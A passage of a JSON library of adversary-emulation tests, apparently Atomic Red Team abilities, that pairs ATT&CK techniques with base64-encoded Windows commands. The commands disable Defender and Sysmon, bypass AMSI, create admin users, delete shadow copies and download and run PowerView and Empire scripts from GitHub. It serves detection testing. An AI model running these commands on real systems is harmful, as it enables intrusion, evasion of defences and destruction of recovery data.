JlbnRjb250cm9sc2V0XHNlcnZpY2VzIC9zIHwgZmluZHN0ciBJbWFnZVBhdGggMj5udWwgfCBmaW5kc3RyIC9SaSAiLipcLnN5cyQiICYmIHJlZyBxdWVyeSBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bg==", "ability_id": "f5ddcd02f3b0fc9f42914c50751dec73", "technique_name": "Query Registry", "additional_info": {}, "privilege": "", "technique_id": "T1012", "platform": "windows", "name": "Query Registry", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Query Windows Registry.\nUpon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).\nReferences:\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n", "variations": []}, {"test": "c2Mgc3RvcCBXaW5EZWZlbmQgJiYgc2MgY29uZmlnIFdpbkRlZmVuZCBzdGFydD1kaXNhYmxlZCAmJiBzYyBxdWVyeSBXaW5EZWZlbmQ=", "ability_id": "29b7a018dce0877b3d2292286a0f512f", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Tamper with Windows Defender Command Prompt", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2Mgc3RhcnQgV2luRGVmZW5kID5udWwgMj4mMSAmJiBzYyBjb25maWcgV2luRGVmZW5kIHN0YXJ0PWVuYWJsZWQgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n", "variations": []}, {"test": "bmV0IHZpZXcgXFxsb2NhbGhvc3Q=", "ability_id": "99b0dd4daabb5d59520204d34f3ff668", "technique_name": "Network Share Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1135", "platform": "windows", "name": "Network Share Discovery command prompt", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution avalaible network shares will be displayed in the powershell session\n", "variations": []}, {"test": "U3RhcnQtQml0c1RyYW5zZmVyIC1Qcmlvcml0eSBmb3JlZ3JvdW5kIC1Tb3VyY2UgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvYXRvbWljcy9UMTE5Ny9UMTE5Ny5tZCAtRGVzdGluYXRpb24gJGVudjpURU1QXGJpdHNhZG1pbjJfZmxhZy5wczE=", "ability_id": "67869d578a1ddad7356f4e3d35a0b2cd", "technique_name": "BITS Jobs", "additional_info": {}, "privilege": "", "technique_id": "T1197", "platform": "windows", "name": "Bitsadmin Download (PowerShell)", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXGJpdHNhZG1pbjJfZmxhZy5wczEgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory\n", "variations": []}, {"test": "cnVuZGxsMzIuZXhlIGFkdnBhY2suZGxsLExhdW5jaElORlNlY3Rpb24gODBkMGUwX1QxMjE4LjAxMS5pbmYsRGVmYXVsdEluc3RhbGxfU2luZ2xlVXNlciwxLA==", "ability_id": "a6495fa4cdcf09233d18bce7eb87fe27", "technique_name": "Signed Binary Proxy Execution: Rundll32", "additional_info": {}, "privilege": "", "technique_id": "T1218.011", "platform": "windows", "name": "Rundll32 advpack.dll Execution", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["80d0e0_T1218.011.inf"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Test execution of a command using rundll32.exe with advpack.dll.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\nUpon execution calc.exe will be launched\n", "variations": []}, {"test": "TmV3LUl0ZW0gLVBhdGggIiRlbnY6VEVNUFxTaGFycEhvdW5kXCIgLUl0ZW1UeXBlIERpcmVjdG9yeSA+ICRudWxsOyAmICIkZW52OlRFTVBcU2hhcnBIb3VuZC5leGUiIC1kICIkZW52OlVzZXJEbnNEb21haW4iIC0tQ29sbGVjdGlvbk1ldGhvZCBMb2NhbEFkbWluIC0tTm9TYXZlQ2FjaGUgLS1PdXRwdXREaXJlY3RvcnkgIiRlbnY6VEVNUFxTaGFycEhvdW5kXCI=", "ability_id": "6e5ddcde678698ef20f1a9d90d81cf23", "technique_name": "Permission Groups Discovery: Local Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.001", "platform": "windows", "name": "SharpHound3 - LocalAdmin", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLVJlY3Vyc2UgJGVudjpURU1QXFNoYXJwSG91bmRcIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvZjk0YTVkMjk4YTFiNGM1ZGZiMWYzMGEyNDZkOWM3M2QxM2IyMjg4OC9SZWNvbi9Qb3dlclZpZXcucHMxJyAtVXNlQmFzaWNQYXJzaW5nKTsgSW52b2tlLUVudW1lcmF0ZUxvY2FsQWRtaW4gIC1WZXJib3Nl", "ability_id": "84a93e5157b690ee0f585cd55c15b0cb", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Find local admins on all machines in domain (PowerView)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n", "variations": []}, {"test": "bmV0IHVzZXIgL2FkZCAiI3t1c2VybmFtZX0iICIje3Bhc3N3b3JkfSIgJiYgbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgIiN7dXNlcm5hbWV9IiAvYWRk", "ability_id": "48d31e40ff939a9ea616219271b1b7a8", "technique_name": "Create Account: Local Account", "additional_info": {}, "privilege": "", "technique_id": "T1136.001", "platform": "windows", "name": "Create a new Windows admin user", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0IHVzZXIgL2RlbCAiVDExMzYuMDAxX0FkbWluIiA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Creates a new admin user in a command prompt.\n", "variations": []}, {"test": "bmV0IGxvY2FsZ3JvdXAgJiYgbmV0IGxvY2FsZ3JvdXAgIkFkbWluaXN0cmF0b3JzIg==", "ability_id": "a1f48fa3ddee658b29b414523c9a295b", "technique_name": "Permission Groups Discovery: Local Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.001", "platform": "windows", "name": "Basic Permission Groups Discovery Windows (Local)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "variations": []}, {"test": "QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29yazY0XHY0LjAuMzAzMTlcY3NjLmV4ZSAvb3V0OkM6XFdpbmRvd3NcVGVtcFxUMTAyNy4wMDQuZXhlIGFmMmYxY19jYWxjLmNz", "ability_id": "7fd07c188cf2be37e4d812caf0840e3d", "technique_name": "Obfuscated Files or Information: Compile After Delivery", "additional_info": {}, "privilege": "", "technique_id": "T1027.004", "platform": "windows", "name": "Compile After Delivery using csc.exe", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["af2f1c_calc.cs"], "cleanup": ["ZGVsIEM6XFdpbmRvd3NcVGVtcFxUMTAyNy4wMDQuZXhlID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Compile C# code using csc.exe binary used by .NET\nUpon execution an exe named T1027.004.exe will be placed in the temp folder\n", "variations": []}, {"test": "Zmx0bWMuZXhlIHVubG9hZCBTeXNtb25EcnY=", "ability_id": "8734f5df1819f82e52312063a392b844", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Unload Sysmon Filter Driver", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c3lzbW9uIC11IC1pID4gbnVsIDI+JjEgJiYgc3lzbW9uIC1pIC1hY2NlcHRldWxhIC1pID4gbnVsIDI+JjEgJiYgJXRlbXAlXFN5c21vblxzeXNtb24uZXhlIC11ID4gbnVsIDI+JjEgJiYgJXRlbXAlXFN5c21vblxzeXNtb24uZXhlIC1hY2NlcHRldWxhIC1pID4gbnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CQy1TRUNVUklUWS9FbXBpcmUvZjZlZmQ1YTk2M2Q0MjRhMWY5ODNkODg0YjYzN2RhODY4ZTVkZjQ2Ni9kYXRhL21vZHVsZV9zb3VyY2UvcHJpdmVzYy9HZXQtU3lzdGVtLnBzMScgLVVzZUJhc2ljUGFyc2luZyk7IEdldC1TeXN0ZW0gLVRlY2huaXF1ZSBOYW1lZFBpcGUgLVZlcmJvc2U=", "ability_id": "d1bde9af5206152c9980a5b6adcc1813", "technique_name": "Access Token Manipulation: Token Impersonation/Theft", "additional_info": {}, "privilege": "", "technique_id": "T1134.001", "platform": "windows", "name": "Named pipe client impersonation", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/", "variations": []}, {"test": "cHl0aG9uIDUzYjEwM19UMTA0Ni5weSAtaSAxMjcuMC4wLjE=", "ability_id": "64818f9563bd722bd6ed5075f5b0ef25", "technique_name": "Network Service Scanning", "additional_info": {}, "privilege": "", "technique_id": "T1046", "platform": "windows", "name": "Port Scan using python", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["53b103_T1046.py"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICI1M2IxMDNfVDEwNDYucHki"], "executor": "psh", "access": {}, "description": "Scan ports to check for listening ports with python\n", "variations": []}, {"test": "IiV0ZW1wJVx0ZW1wX1QxMDI3LnppcFxUMTAyNy5leGUi", "ability_id": "c4037679686baae613809ecdf561fcf5", "technique_name": "Obfuscated Files or Information", "additional_info": {}, "privilege": "", "technique_id": "T1027", "platform": "windows", "name": "Execution from Compressed File", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["dGFza2tpbGwgL2YgL2ltIGNhbGN1bGF0b3IuZXhlID5udWwgMj5udWwgJiYgcm1kaXIgL1MgL1EgJXRlbXAlXHRlbXBfVDEwMjcuemlwID5udWwgMj5udWwgJiYgZGVsIC9RICIldGVtcCVcVDEwMjcuemlwIiA+bnVsIDI+bnVs"], "executor": "cmd", "access": {}, "description": "Mimic execution of compressed executable. When successfully executed, calculator.exe will open.\n", "variations": []}, {"test": "cG93ZXJzaGVsbC5leGUgLUNvbW1hbmQgV2luZG93c0F1ZGlvRGV2aWNlLVBvd2Vyc2hlbGwtQ21kbGV0", "ability_id": "53d41aa7edbb10cea4c99df8c2b0862f", "technique_name": "Audio Capture", "additional_info": {}, "privilege": "", "technique_id": "T1123", "platform": "windows", "name": "using device audio capture commandlet", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n", "variations": []}, {"test": "Y29weSAld2luZGlyJVxTeXN0ZW0zMlx3aW5kb3dzcG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlICVBUFBEQVRBJVx1cGRhdGVyLmV4ZSAmJiBjb3B5ICV3aW5kaXIlXFN5c3RlbTMyXGFtc2kuZGxsICVBUFBEQVRBJVxhbXNpLmRsbCAmJiAlQVBQREFUQSVcdXBkYXRlci5leGUgLUNvbW1hbmQgZXhpdA==", "ability_id": "63bbedafba2f541552ac3579e9e3737b", "technique_name": "Hijack Execution Flow: DLL Search Order Hijacking", "additional_info": {}, "privilege": "", "technique_id": "T1574.001", "platform": "windows", "name": "DLL Search Order Hijacking - amsi.dll", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICVBUFBEQVRBJVx1cGRhdGVyLmV4ZSA+bnVsIDI+JjEgJiYgZGVsICVBUFBEQVRBJVxhbXNpLmRsbCA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)\nhttps://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n\nUpon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvbWFzdGVyL1JlY29uL1Bvd2VyVmlldy5wczEnIC1Vc2VCYXNpY1BhcnNpbmcpOyBHZXQtRG9tYWluR3JvdXBNZW1iZXIgIkRvbWFpbiBBZG1pbnMi", "ability_id": "2594698a8e38a85b0d98468d87b49821", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Get-DomainGroupMember with PowerView", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZykgOyBJbnZva2UtTWFsZG9jIC1tYWNyb0ZpbGUgIlBhdGhUb0F0b21pY3NGb2xkZXJcVDEwNTkuMDA1XHNyY1xUMTA1OV8wMDUtbWFjcm9jb2RlLnR4dCIgLW9mZmljZVByb2R1Y3QgIldvcmQiIC1zdWIgIkV4dHJhY3Qi", "ability_id": "5114eef0155acf3f304e9780df2b548e", "technique_name": "Command and Scripting Interpreter: Visual Basic", "additional_info": {}, "privilege": "", "technique_id": "T1059.005", "platform": "windows", "name": "Extract Memory via VBA", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gIiRlbnY6VEVNUFxhdG9taWNfdDEwNTlfMDA1X3Rlc3Rfb3V0cHV0LmJpbiIgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this\nwe first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that\nmemory location to a file stored in the $env:TEMP\\atomic_t1059_005_test_output.bin.\n", "variations": []}, {"test": "IkM6XFByb2dyYW0gRmlsZXNcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs", "ability_id": "197a322f46033d8c1e5011967a0bce41", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Remove Windows Defender Definition Files", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n", "variations": []}, {"test": "ZWNobyBUMTQ4NiAtIFB1cmVsb2NrZXIgUmFuc29tIE5vdGUgPiAlVVNFUlBST0ZJTEUlXERlc2t0b3BcWU9VUl9GSUxFUy50eHQ=", "ability_id": "d82ceb9939d3d920ee550187ad8235c8", "technique_name": "Data Encrypted for Impact", "additional_info": {}, "privilege": "", "technique_id": "T1486", "platform": "windows", "name": "PureLocker Ransom Note", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICVVU0VSUFJPRklMRSVcRGVza3RvcFxZT1VSX0ZJTEVTLnR4dCA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n", "variations": []}, {"test": "U3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgaGlkZGVuIGNhbGMuZXhl", "ability_id": "9a2edad4053a2b59fb9167a9bc29e7dc", "technique_name": "Hide Artifacts: Hidden Window", "additional_info": {}, "privilege": "", "technique_id": "T1564.003", "platform": "windows", "name": "Hidden Window", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Launch PowerShell with the \"-WindowStyle Hidden\" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\nUpon execution a hidden PowerShell window will launch calc.exe\n", "variations": []}, {"test": "ZWNobyAidGVzdCIgPiAkZW52OlRFTVBcVDE1NjQuMDA0X2hhc19hZHNfcG93ZXJzaGVsbC50eHQgfCBzZXQtY29udGVudCAtcGF0aCB0ZXN0LnR4dCAtc3RyZWFtIGFkc3Rlc3QudHh0IC12YWx1ZSAidGVzdCI7IHNldC1jb250ZW50IC1wYXRoICRlbnY6VEVNUFxUMTU2NC4wMDRfaGFzX2Fkc19wb3dlcnNoZWxsLnR4dCAtc3RyZWFtIGFkc3Rlc3QudHh0IC12YWx1ZSAidGVzdDIiOyBzZXQtY29udGVudCAtcGF0aCAuIC1zdHJlYW0gYWRzdGVzdC50eHQgLXZhbHVlICJ0ZXN0MyI=", "ability_id": "76b6066fe170d38215251102e42be973", "technique_name": "Hide Artifacts: NTFS File Attributes", "additional_info": {}, "privilege": "", "technique_id": "T1564.004", "platform": "windows", "name": "Create ADS PowerShell", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggJGVudjpURU1QXFQxNTY0LjAwNF9oYXNfYWRzX3Bvd2Vyc2hlbGwudHh0IC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command \"ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\"\nin the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run \"notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt\" in the %temp% folder.\n", "variations": []}, {"test": "JUxPQ0FMQVBQREFUQTp+LTMsMSVtZCAvYyBlY2hvIEhlbGxvLCBmcm9tIENNRCEgPiBoZWxsby50eHQgJiB0eXBlIGhlbGxvLnR4dA==", "ability_id": "6c318ef0339d74d909ad556681b6493e", "technique_name": "Command and Scripting Interpreter: Windows Command Shell", "additional_info": {}, "privilege": "", "technique_id": "T1059.003", "platform": "windows", "name": "Suspicious Execution via Windows Command Shell", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Command line executed via suspicious invocation. Example is from the 2021 Threat Detection Report by Red Canary.\n", "variations": []}, {"test": "QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2NC4wLjMwMzE5XGNzYy5leGUgL3I6U3lzdGVtLkVudGVycHJpc2VTZXJ2aWNlcy5kbGwgL291dDoiJXRtcCVcVDEyMTguMDA5LmRsbCIgL3RhcmdldDpsaWJyYXJ5IGFhYWEwOF9UMTIxOC4wMDkuY3MgJiYgQzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2NC4wLjMwMzE5XHJlZ2FzbS5leGUgL1UgJXRtcCVcVDEyMTguMDA5LmRsbA==", "ability_id": "1f375290266b7c80cbf0363bac321219", "technique_name": "Signed Binary Proxy Execution: Regsvcs/Regasm", "additional_info": {}, "privilege": "", "technique_id": "T1218.009", "platform": "windows", "name": "Regasm Uninstall Method Call Test", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["aaaa08_T1218.009.cs"], "cleanup": ["ZGVsICV0bXAlXFQxMjE4LjAwOS5kbGwgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Executes the Uninstall Method, No Admin Rights Required. Upon execution, \"I shouldn't really execute either.\" will be displayed.\n", "variations": []}, {"test": "SUYgIiVQUk9DRVNTT1JfQVJDSElURUNUVVJFJSI9PSJBTUQ2NCIgKEM6XFdpbmRvd3Ncc3lzd293NjRccmVnc3ZyMzIuZXhlIC9zIGJhZmRmM19BbGxUaGVUaGluZ3N4ODYuZGxsKSBFTFNFICggQzpcV2luZG93c1xzeXN0ZW0zMlxyZWdzdnIzMi5leGUgL3MgYmFmZGYzX0FsbFRoZVRoaW5nc3g4Ni5kbGwgKQ==", "ability_id": "17bec14a26b2aa94edcbe4e8e8e0c97e", "technique_name": "Signed Binary Proxy Execution: Regsvr32", "additional_info": {}, "privilege": "", "technique_id": "T1218.010", "platform": "windows", "name": "Regsvr32 local DLL execution", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["bafdf3_AllTheThingsx86.dll"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n", "variations": []}, {"test": "cnVuZGxsMzIuZXhlIEM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG93bmxvYWRzXGNhbGMucG5nLCBTdGFydFc=", "ability_id": "effd1be56656c570e7d336f2b3673868", "technique_name": "Signed Binary Proxy Execution: Rundll32", "additional_info": {}, "privilege": "", "technique_id": "T1218.011", "platform": "windows", "name": "Execution of non-dll using rundll32.exe", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Rundll32.exe running non-dll \n", "variations": []}, {"test": "Z2V0LXdtaU9iamVjdCAtY2xhc3MgV2luMzJfUHJvY2Vzcw==", "ability_id": "1ddf2b8ee6a56ce9f9132a168947653e", "technique_name": "Process Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1057", "platform": "windows", "name": "Process Discovery - get-wmiObject", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n", "variations": []}, {"test": "R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyRfLkRlbGV0ZSgpO30=", "ability_id": "e90756bb6dcd21462dc4cc452661df91", "technique_name": "Inhibit System Recovery", "additional_info": {}, "privilege": "", "technique_id": "T1490", "platform": "windows", "name": "Windows - Delete Volume Shadow Copies via WMI with PowerShell", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.\nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution\nthere may be no output displayed.\n", "variations": []}, {"test": "MTIwMTFjX0FkRmluZC5leGUgLXNjIGV4Y2hhZGRyZXNzZXM=", "ability_id": "d57373ae8a4e7b88083df96fb759bd1f", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Adfind - Enumerate Active Directory Exchange AD Objects", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["12011c_AdFind.exe"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "variations": []}, {"test": "U0NIVEFTS1MgL0NyZWF0ZSAvUyBsb2NhbGhvc3QgL1JVIERPTUFJTlx1c2VyIC9SUCBBdDBtaWNTdHJvbmcgL1ROICJBdG9taWMgdGFzayIgL1RSICJDOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiIC9TQyBkYWlseSAvU1QgMjA6MTA=", "ability_id": "81ffd171df9baca7df26c1831e985233", "technique_name": "Scheduled Task/Job: Scheduled Task", "additional_info": {}, "privilege": "", "technique_id": "T1053.005", "platform": "windows", "name": "Scheduled task Remote", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["U0NIVEFTS1MgL0RlbGV0ZSAvUyBsb2NhbGhvc3QgL1UgRE9NQUlOXHVzZXIgL1AgQXQwbWljU3Ryb25nIC9UTiAiQXRvbWljIHRhc2siIC9GID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Create a task on 